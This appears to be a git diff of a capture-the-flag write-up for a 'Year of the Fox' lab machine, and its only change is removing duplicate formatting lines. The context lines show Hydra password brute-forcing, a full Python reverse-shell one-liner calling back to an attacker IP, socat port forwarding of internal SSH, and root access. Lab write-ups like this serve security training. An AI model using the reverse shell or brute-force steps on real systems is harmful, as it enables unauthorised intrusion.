@@ -39,7 +39,6 @@ Service Info: Host: year-of-the-fox.lan
 Service detection performed.
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -223,7 +222,6 @@ No printers returned.
 enum4linux complete on Thu Sep 21 13:13:48 2023
 ```
 {: .nolineno}
-{: .nolineno}
 
 >Note : Each time you load this machine all the password gets changes .
 {: prompt-danger }
@@ -244,7 +242,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:19:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:23:08
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I logged in and got a search page like this →
@@ -268,14 +265,12 @@ Now I the payload of base 64 encode-decode one for reverse shell like this →
 }
 ```
 {: .nolineno}
-{: .nolineno}
 
 The base64 encode payload is this →
 
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.83.156",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I got the payload and the web flag →
@@ -306,7 +301,6 @@ www-data@year-of-the-fox:/tmp$ export TERM=xterm
 www-data@year-of-the-fox:/tmp$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I checked the network interface to see what else is running and I got this →
 
@@ -315,7 +309,6 @@ www-data@year-of-the-fox:/tmp$ ss -tunlp | grep 127.0.0.1
 tcp   LISTEN  0        128                127.0.0.1:22            0.0.0.0:*                                                                                     
 www-data@year-of-the-fox:/tmp$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Since port 22 is running internally and not externally so lets check its ssh configuration file →
@@ -346,7 +339,6 @@ AllowUsers fox
 www-data@year-of-the-fox:/tmp$
 ```
 {: .nolineno}
-{: .nolineno}
 
 I noted that the victim machine is actually runing the port 22 internally and the ssh login is Allowed for fox user so lets now access this port 22 externally and for that I need to perform port forwording with `port2port` and I will be using the simple tool called <mark style="background: #FF5582A6;">socat</mark> you can get the commands from [here](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#socat). that lets me interact this 22 port with other port on externally so lets do it .
 
@@ -368,7 +360,6 @@ www-data@year-of-the-fox:/tmp$ chmod +x *
 www-data@year-of-the-fox:/tmp$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now lets morph this port 22 to 2222 on victim machine so that we can access this 22 port externally through 2222 port it will be done like this ⤵️ 
 
@@ -377,7 +368,6 @@ www-data@year-of-the-fox:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:12
 [1] 1021
 www-data@year-of-the-fox:/tmp$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now lets try to access the 2222 port from attackers machine like this →
@@ -392,7 +382,6 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[10.10.167.224]:2222' (ED25519) to the list of known hosts.
 fox@10.10.167.224s password:
 ```
-{: .nolineno}
 {: .nolineno}
 
 I see , so I can access this port so lets brute force the password of user FOX which we want to connect to →
@@ -413,7 +402,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:27:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:27:25
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now Its SSH Time ⤵️ 
@@ -507,7 +495,6 @@ Mwo=
 Good luck!
 root@year-of-the-fox:/home/rascal#
 ```
-{: .nolineno}
 {: .nolineno}
 
 >This machine mainly teaches me about Port Forwarding !!
